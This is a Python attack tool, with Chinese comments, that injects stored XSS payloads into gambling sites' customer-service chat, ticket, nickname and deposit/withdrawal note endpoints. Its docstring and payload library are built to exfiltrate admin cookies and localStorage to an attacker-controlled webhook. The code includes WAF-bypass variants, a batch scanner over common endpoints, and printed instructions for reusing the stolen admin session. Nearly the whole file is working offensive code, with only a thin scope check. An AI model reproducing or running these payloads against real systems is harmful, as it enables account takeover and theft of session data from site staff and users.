#!/usr/bin/env python3
"""存储型 XSS 探针 — 博彩站客服/IM 专项。

博彩站有一个几乎 100% 存在 XSS 的攻击面被忽视：
  **在线客服 / IM 聊天窗口**

  用户 → 给客服发一条含 <script> 的消息
       → 客服管理面板（admin 账号）渲染该消息
       → XSS 执行：window.location + document.cookie → 你的服务器
       → 拿到 admin 后台 session

同类攻击面：
  - 充值/提现备注字段（admin 要看备注）
  - 用户名 / 昵称（admin 用户列表）
  - 投诉/工单系统
  - 推广链接说明
  - 站内信

示例:
  python3 炼蛊房/stored_xss_probe.py payloads  # 显示所有 payload
  python3 炼蛊房/stored_xss_probe.py scan \
    --base https://target.com --token <用户token> --case <案卷>
  python3 炼蛊房/stored_xss_probe.py inject \
    --url https://target.com/api/customer-service/send \
    --param message --token <token> --webhook https://your.host/xss \
    --case <案卷>
"""
from __future__ import annotations
import argparse
import json
import sys
import time
from datetime import datetime, UTC
from pathlib import Path

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

ENGINE = Path(__file__).resolve().parents[1]
OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope  # noqa: E402

def _now(): return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "xss"
    d.mkdir(parents=True, exist_ok=True)
    return d

# ────── XSS Payload 库 ──────
def build_payloads(webhook: str = "https://YOUR_WEBHOOK") -> dict[str, str]:
    """返回 {名称: payload} 字典。"""
    wh = webhook.rstrip("/")
    cookie_js = f"fetch('{wh}/xss?c='+encodeURIComponent(document.cookie))"
    full_js    = (f"var d=document;fetch('{wh}/xss?'+"
                  f"'u='+encodeURIComponent(location.href)+"
                  f"'&c='+encodeURIComponent(d.cookie)+"
                  f"'&ls='+encodeURIComponent(JSON.stringify(localStorage)))")

    return {
        # 基础 script 标签
        "basic_script":    f'<script>{cookie_js}</script>',
        "script_onerror":  f'<script src=x onerror="{cookie_js}"></script>',
        # img 事件
        "img_onerror":     f'<img src=x onerror="{cookie_js}">',
        "img_onload":      f'<img src="https://www.google.com" onload="{cookie_js}">',
        # SVG
        "svg_onload":      f'<svg onload="{cookie_js}">',
        "svg_animate":     f'<svg><animate onbegin="{cookie_js}" attributeName=x dur=1s>',
        # 事件属性（绕过 script 过滤）
        "body_onpageshow": f'<body onpageshow="{cookie_js}">',
        "details_open":    f'<details open ontoggle="{cookie_js}">',
        "input_autofocus": f'<input onfocus="{cookie_js}" autofocus>',
        "video_onerror":   f'<video src=x onerror="{cookie_js}">',
        # 编码变体（绕过 WAF/过滤）
        "html_entity":     f'&lt;img src=x onerror="{cookie_js}"&gt;',  # 测试是否被反转义
        "unicode_escape":  f'<img src=x onerror="{cookie_js.replace("(", "&#40;").replace(")", "&#41;")}">',
        # Markdown/富文本（部分站用 MD 渲染）
        "markdown_img":    f'![x](x "a\\" onerror=\\"{cookie_js}\\")',
        "markdown_link":   f'[click](javascript:{cookie_js})',
        # JSON 注入（API 字段里）
        "json_escape":     f'">\u003cscript\u003e{cookie_js}\u003c/script\u003e',
        # 完整信息收集
        "full_info":       f'<script>{full_js}</script>',
        # CSP 绕过（用站内脚本加载）
        "csp_bypass_meta": f'<meta http-equiv="refresh" content="0;url=javascript:{cookie_js}">',
    }

# 客服/用户输入 API 端点路径（博彩站通用）
CS_ENDPOINTS = [
    # 客服消息
    ("/api/customer-service/send",     "message"),
    ("/api/cs/send",                   "message"),
    ("/api/support/message",           "content"),
    ("/api/chat/send",                 "message"),
    ("/api/im/send",                   "content"),
    ("/api/service/send",              "msg"),
    ("/api/feedback/submit",           "content"),
    ("/api/complaint/submit",          "content"),
    # 用户资料（昵称/备注 → admin 看）
    ("/api/user/update",               "nickname"),
    ("/api/user/profile",              "remark"),
    ("/api/member/update",             "nick"),
    # 提现备注
    ("/api/withdraw/apply",            "remark"),
    ("/api/withdrawal/create",         "note"),
    # 充值备注
    ("/api/deposit/apply",             "remark"),
    ("/api/recharge/create",           "note"),
    # 工单
    ("/api/ticket/create",             "content"),
    ("/api/help/submit",               "description"),
    # 站内信
    ("/api/message/send",              "content"),
    ("/api/mail/send",                 "body"),
]

def inject_payload(sess, base: str, path: str, param: str,
                   payload: str, auth: dict, timeout: float) -> dict | None:
    url = base.rstrip("/") + path
    body = {**auth, param: payload, "content": payload, "message": payload}
    for method in ("POST", "PUT"):
        try:
            r = getattr(sess, method.lower())(url, json=body, timeout=timeout)
            data = {}
            try: data = r.json()
            except: pass
            code = data.get("code", data.get("status", -1))
            if r.status_code in (200,) and code in (0, 200, "0", "200", "ok"):
                return {"endpoint": path, "param": param, "status": r.status_code,
                        "code": code, "response": str(data)[:200]}
        except Exception:
            pass
    return None

def cmd_payloads(args: argparse.Namespace) -> int:
    wh = getattr(args, "webhook", "https://YOUR_WEBHOOK")
    payloads = build_payloads(wh)
    for name, p in payloads.items():
        print(f"\n[{name}]\n  {p}")
    return 0

def cmd_scan(args: argparse.Namespace) -> int:
    base = args.base.rstrip("/")
    domain = host_of(base)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")

    payloads = build_payloads(args.webhook)
    auth = {}
    if args.token:
        auth["token"] = args.token
    if args.cookie:
        pass  # cookie 通过 sess

    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0"
    if args.token:
        sess.headers["Authorization"] = f"Bearer {args.token}"
        sess.headers["token"] = args.token
    if args.cookie:
        sess.headers["Cookie"] = args.cookie

    print(f"[*] scanning {len(CS_ENDPOINTS)} CS endpoints × {len(payloads)} payloads …")
    results = []

    for path, param in CS_ENDPOINTS:
        # 快速探测端点是否存在
        try:
            r = sess.get(base + path, timeout=5)
            if r.status_code == 404:
                continue
        except Exception:
            continue

        for pname, payload in list(payloads.items())[:6]:  # 先测前 6 个
            hit = inject_payload(sess, base, path, param, payload, auth, args.timeout)
            if hit:
                hit["payload_name"] = pname
                results.append(hit)
                print(f"  ★ {path} [{param}] = {pname}  → code={hit['code']}")
                break
        time.sleep(0.5)

    out = case_dir(args.case)
    out_json = out / "xss_scan.json"
    out_json.write_text(json.dumps({"ts": _now(), "base": base, "webhook": args.webhook,
                                    "results": results}, ensure_ascii=False, indent=2) + "\n",
                        encoding="utf-8")
    print(f"\n[result] {len(results)} injectable endpoints → {out_json}")
    if results:
        print(f"\n[next] 等待 webhook 回调到 {args.webhook}")
        print("  payload 已注入，等 admin 打开消息列表时 JS 自动执行")
        print("  拿到 admin cookie 后：")
        print("    curl -b 'admin_session=XXX' https://target.com/admin/users")
    return 0 if results else 1

def cmd_inject(args: argparse.Namespace) -> int:
    """单端点注入，精确控制 payload。"""
    domain = host_of(args.url)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")

    payloads = build_payloads(args.webhook)
    sess = requests.Session()
    sess.verify = False
    if args.token:
        sess.headers["Authorization"] = f"Bearer {args.token}"
        sess.headers["token"] = args.token

    hits = []
    for pname, payload in payloads.items():
        try:
            r = sess.post(args.url, json={args.param: payload}, timeout=args.timeout)
            data = {}
            try: data = r.json()
            except: pass
            print(f"  [{pname}] status={r.status_code} code={data.get('code','?')} len={len(r.content)}")
            code = data.get("code", data.get("status", -1))
            if r.status_code == 200 and code in (0, 200, "0", "200"):
                hits.append(pname)
                print("    ★ INJECTED")
        except Exception as e:
            print(f"  [{pname}] err: {e}")
        time.sleep(0.3)

    out = case_dir(args.case)
    (out / "inject_result.json").write_text(
        json.dumps({"ts": _now(), "url": args.url, "param": args.param,
                    "injected": hits}, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"\n[result] {len(hits)} payloads injected: {hits}")
    return 0 if hits else 1

def main() -> int:
    p = argparse.ArgumentParser(description="存储型 XSS 探针（博彩站客服/IM）")
    sub = p.add_subparsers(dest="cmd", required=True)

    pl = sub.add_parser("payloads", help="显示所有 XSS payload")
    pl.add_argument("--webhook", default="https://YOUR_WEBHOOK")
    pl.set_defaults(func=cmd_payloads)

    sc = sub.add_parser("scan", help="批量扫描客服/IM 端点")
    sc.add_argument("--base", required=True)
    sc.add_argument("--case", required=True)
    sc.add_argument("--token", default="")
    sc.add_argument("--cookie", default="")
    sc.add_argument("--webhook", default="https://YOUR_WEBHOOK",
                    help="你的 OOB webhook，用于接收 admin cookie")
    sc.add_argument("--timeout", type=float, default=10.0)
    sc.set_defaults(func=cmd_scan)

    inj = sub.add_parser("inject", help="单端点精确注入")
    inj.add_argument("--url", required=True)
    inj.add_argument("--param", required=True)
    inj.add_argument("--token", default="")
    inj.add_argument("--webhook", required=True)
    inj.add_argument("--case", default="")
    inj.add_argument("--timeout", type=float, default=10.0)
    inj.set_defaults(func=cmd_inject)

    args = p.parse_args()
    return int(args.func(args) or 0)

if __name__ == "__main__":
    raise SystemExit(main())
